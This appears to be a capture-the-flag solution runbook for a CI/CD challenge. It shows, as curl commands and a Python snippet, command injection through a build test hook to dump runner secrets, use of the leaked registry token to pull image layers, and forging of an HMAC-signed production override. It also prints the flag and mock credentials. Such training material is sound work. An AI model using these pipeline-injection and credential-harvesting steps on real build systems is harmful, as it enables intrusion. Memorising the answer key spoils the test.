# X01 — Jenkins Nightmare: Complete Solution & Architecture Runbook

## 1. Challenge Identity & Concept Summary

**Challenge ID:** X01  
**Name:** Jenkins Nightmare  
**Category:** CI/CD / Build Runner Sandbox / Container Registry Forensics  
**Difficulty:** Expert / Bonus  
**External Interface:** TCP/80 (HTTP Web Console & REST API)  
**Classification:** SANDBOX_REQUIRED  

This challenge demonstrates the systemic risk of trusting intermediate pipeline components in automated CI/CD chains. Participants compromise a simulated multi-stage CI/CD pipeline by discovering parameter injection in test hooks, capturing internal runner registry credentials, exploring historical/production image layers in an unexposed OCI registry, and forging an authorized production dispatch request using recovered HMAC keys.

---

## 2. Intended Chain of Trust

```text
Player
   |
   | TCP/80 (Web UI / REST API)
   v
Mock Git (Repositories & Pipeline Specifications)
   |
   v
CI Gateway & Orchestrator (Job Scheduling & Parameter Passing)
   |
   v
Local Build Runtime Sandbox (Isolated Runner, Ephemeral Workspace, 90s Timeout)
   |
   v
Private OCI Container Registry (http://127.0.0.1:5000 / /registry/v2/)
   |
   v
Production Mock Mainframe (http://127.0.0.1:8081 / /api/v1/production/)
   |
   v
Flag: YUVA{c1_cd_ch41n_0f_trust_c0mpr0m1s3d_x01}
```

---

## 3. Step-by-Step Intended Solve

### Step 1: CI & Git Repository Enumeration
1. Connect to the web application at `http://<TARGET_HOST>:8080/`.
2. Inspect the repository browser or query the REST API:
   ```bash
   curl -s http://<TARGET_HOST>:8080/api/repos | jq .
   ```
3. Inspect repository `latveria/defense-core` file `pipeline.yaml`:
   ```bash
   curl -s "http://<TARGET_HOST>:8080/api/repos/latveria/defense-core/blob?path=pipeline.yaml" | jq -r .content
   ```
4. Observe the pipeline definition:
   - Stage 2 (`Unit & Integration Tests`) evaluates `CUSTOM_TEST_HOOK` in the runner sub-shell.
   - Stage 4 (`Push to Private Registry`) pushes images to `http://127.0.0.1:5000` using `REGISTRY_AUTH_TOKEN`.

### Step 2: Limited Pipeline Control & Build Influence
1. Trigger a custom pipeline build via `POST /api/builds/trigger`, passing a diagnostic hook in `build_hook` / `CUSTOM_TEST_HOOK`:
   ```bash
   curl -s -X POST http://<TARGET_HOST>:8080/api/builds/trigger \
        -H "Content-Type: application/json" \
        -d '{
          "repo": "latveria/defense-core",
          "branch": "main",
          "build_hook": "env"
        }'
   ```
   The API responds with `build_id` (e.g. `102`).

### Step 3: Inspect Build Output & Artifacts
1. Retrieve the build console output:
   ```bash
   curl -s http://<TARGET_HOST>:8080/api/builds/102 | jq -r '.logs[]'
   ```
2. In the `[hook-out]` section of the logs, observe the environment variables populated in the isolated runner:
   - `REGISTRY_AUTH_TOKEN=latv_reg_tok_7729104820194810`
   - `REGISTRY_HOST=http://127.0.0.1:5000`
   - `LATVERIA_CI_RUNNER=v3.2-sandboxed`

### Step 4: Access Local Private OCI Registry
1. The CI Gateway exposes the registry proxy at `/registry/v2/` (or `/v2/`).
2. Query the registry catalog with the extracted Bearer token:
   ```bash
   curl -s -H "Authorization: Bearer latv_reg_tok_7729104820194810" \
        http://<TARGET_HOST>:8080/registry/v2/_catalog
   ```
   Response: `{"repositories": ["latveria/defense-core", "latveria/production-core"]}`

3. List tags for `latveria/production-core`:
   ```bash
   curl -s -H "Authorization: Bearer latv_reg_tok_7729104820194810" \
        http://<TARGET_HOST>:8080/registry/v2/latveria/production-core/tags/list
   ```
   Response: `{"name": "latveria/production-core", "tags": ["v1.0.0-release", "latest"]}`

4. Retrieve the manifest for `v1.0.0-release`:
   ```bash
   curl -s -H "Authorization: Bearer latv_reg_tok_7729104820194810" \
        http://<TARGET_HOST>:8080/registry/v2/latveria/production-core/manifests/v1.0.0-release
   ```
   Identify layer digests in the manifest:
   - Layer 1: Base OS diff
   - Layer 2: Sensitive configuration layer diff

5. Download Layer 2 blob:
   ```bash
   curl -s -H "Authorization: Bearer latv_reg_tok_7729104820194810" \
        http://<TARGET_HOST>:8080/registry/v2/latveria/production-core/blobs/<LAYER2_DIGEST> \
        -o layer2.tar.gz
   ```

6. Inspect layer contents:
   ```bash
   tar -ztvf layer2.tar.gz
   tar -zxvf layer2.tar.gz etc/latveria/production.conf
   cat etc/latveria/production.conf
   ```
   Extracted credentials:
   - `PROD_MASTER_KEY = latv_prod_master_sec_9918230184719204`
   - `DEPLOY_AGENT_ID = DOOM-PROD-ORCHESTRATOR-01`
   - `PRODUCTION_GATEWAY_URL = http://127.0.0.1:8081/api/v1/production/unlock`
   - `SIGNATURE_SCHEME = HMAC-SHA256`
   - `TARGET_CORE = SOVEREIGN_CORE`
   - `AUTHORIZED_ACTION = OVERRIDE_PRODUCTION_MAINFRAME`

### Step 5: Pivot to Production Mock & Retrieve Flag
1. Formulate the production override payload:
   ```json
   {"action": "OVERRIDE_PRODUCTION_MAINFRAME", "target": "SOVEREIGN_CORE"}
   ```
2. Compute HMAC-SHA256 signature using `PROD_MASTER_KEY`:
   ```python
   import hashlib, hmac
   key = b"latv_prod_master_sec_9918230184719204"
   body = b'{"action": "OVERRIDE_PRODUCTION_MAINFRAME", "target": "SOVEREIGN_CORE"}'
   sig = hmac.new(key, body, hashlib.sha256).hexdigest()
   ```
3. Submit the request through the Production Gateway route:
   ```bash
   curl -s -X POST http://<TARGET_HOST>:8080/api/v1/production/unlock \
        -H "Content-Type: application/json" \
        -H "X-Latveria-Deploy-Agent: DOOM-PROD-ORCHESTRATOR-01" \
        -H "X-Latveria-Signature: <COMPUTED_SIG>" \
        -d '{"action": "OVERRIDE_PRODUCTION_MAINFRAME", "target": "SOVEREIGN_CORE"}'
   ```
4. Response:
   ```json
   {
     "status": "AUTHORIZATION_VERIFIED",
     "message": "Sovereign defense mainframe production override granted.",
     "deploy_agent": "DOOM-PROD-ORCHESTRATOR-01",
     "flag": "YUVA{c1_cd_ch41n_0f_trust_c0mpr0m1s3d_x01}"
   }
   ```

---

## 4. Sandbox Architecture & Isolation Guarantees

- **No Real Docker Socket**: The challenge runs in an isolated container sandbox. Real `/var/run/docker.sock` is never exposed.
- **Resource Enforcement**: Container limits enforce 2 vCPU, 2 GiB memory, and a 90-second execution timeout per build.
- **Loopback Isolation**: Registry (port 5000) and Production Mock (port 8081) bind strictly to `127.0.0.1` and are only accessible through the gateway router.
- **No External Network Dependencies**: All source packages, mock git repositories, OCI layers, and test suites are self-contained within the challenge image.

---

## 5. Automated Reset Verification

To reset challenge state:
```bash
curl -X POST http://<TARGET_HOST>:8080/api/reset
```
Or restart the container instance via platform controller.
